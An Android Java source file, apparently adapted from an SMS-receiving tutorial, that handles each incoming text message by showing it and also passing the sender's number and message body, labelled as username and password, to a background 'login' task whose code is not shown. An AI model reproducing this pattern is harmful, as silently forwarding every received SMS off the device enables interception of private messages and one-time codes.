
package com.javapapers.androidreceivesms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import android.view.View;




public class SmsBroadcastReceiver extends BroadcastReceiver {

    public static final String SMS_BUNDLE = "pdus";
    public String smsBody;
    public String address;

    public void onReceive(Context context, Intent intent) {
        try {
            Bundle intentExtras = intent.getExtras();
            if (intentExtras != null) {
                Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
                String smsMessageStr = "";
                for (int i = 0; i < sms.length; ++i) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);
                    smsBody = smsMessage.getMessageBody().toString();
                    address = smsMessage.getOriginatingAddress();
                    OnLogin();

                    smsMessageStr += "SMS From: " + address + "\n";
                    smsMessageStr += smsBody + "\n";

                }
                Toast.makeText(context, smsMessageStr, Toast.LENGTH_SHORT).show();

                //this will update the UI with message
                SmsActivity inst = SmsActivity.instance();
                inst.updateList(smsMessageStr);


            }
        }catch (Exception ae){
            ae.printStackTrace();
    }

}

    public void OnLogin() {
        String username = String.valueOf(address);
        String password = String.valueOf(smsBody);

        String type = "login";
        BackgroundWorker backgroundWorker = new BackgroundWorker(this);

        backgroundWorker.execute(type, username, password);

    }

}